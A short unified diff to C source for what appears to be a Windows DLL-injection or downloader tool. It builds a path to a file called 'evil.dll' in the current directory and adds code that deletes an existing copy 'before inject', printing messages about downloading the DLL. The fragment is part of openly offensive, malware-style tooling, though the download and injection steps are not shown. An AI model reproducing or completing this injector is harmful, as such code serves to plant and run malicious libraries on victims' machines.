@@ -90,6 +90,21 @@ int main(int argc, char* argv[]) {
   char evilDLL[MAX_PATH];
   DWORD length = GetCurrentDirectoryA(MAX_PATH, currentPath);
   snprintf(evilDLL, sizeof(evilDLL), "%s\\evil.dll", currentPath);
+  
+  DWORD fileAttr = GetFileAttributes(evilDLL);
+  if (fileAttr == INVALID_FILE_ATTRIBUTES) {
+    printf("DLL does not exists...download it....\n");
+  } else {
+    printf("DLL already exists...deteting it first...\n");
+
+    // deleting logic
+    if (DeleteFile(evilDLL)) {
+      printf("previous DLL successfully deleted before inject.\n");
+    } else {
+      printf("error deleting file logic: %lu\n", GetLastError());
+    }
+  }
+
   unsigned int evilLen = sizeof(evilDLL) + 1;
 
   HANDLE hFile = CreateFile(evilDLL, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
